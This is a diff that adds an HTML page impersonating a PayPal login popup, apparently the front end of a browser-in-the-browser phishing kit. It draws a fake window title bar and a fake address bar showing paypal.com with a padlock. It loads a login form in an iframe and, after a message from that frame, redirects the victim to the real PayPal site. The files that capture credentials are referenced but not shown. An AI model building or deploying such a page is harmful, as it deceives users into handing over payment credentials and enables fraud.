@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="./logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">Paypal Login</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://www.paypal.com/accounts/verify.php?=</span>
+		<span id="domain-path">cWRmamggd3FoZXVmaCB3cWhmIGdxd3VmMzJyNDkwMnUgcnF3Zg==</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="login.html" frameBorder="0"></iframe>
+</div>
+
+<script>
+  // Listen for a message from the iframe
+  window.addEventListener("message", function(event) {
+    if (event.data === "closeIframeAndRedirect") {
+      // Close the iframe window
+      var iframe = document.getElementById("content");
+      iframe.style.display = "none";
+
+      // Redirect the main browser window to paypal.com
+      window.location.href = "https://www.paypal.com";
+    }
+  });
+</script>
+
+</body>
+<script src="script.js"></script>
+</html>
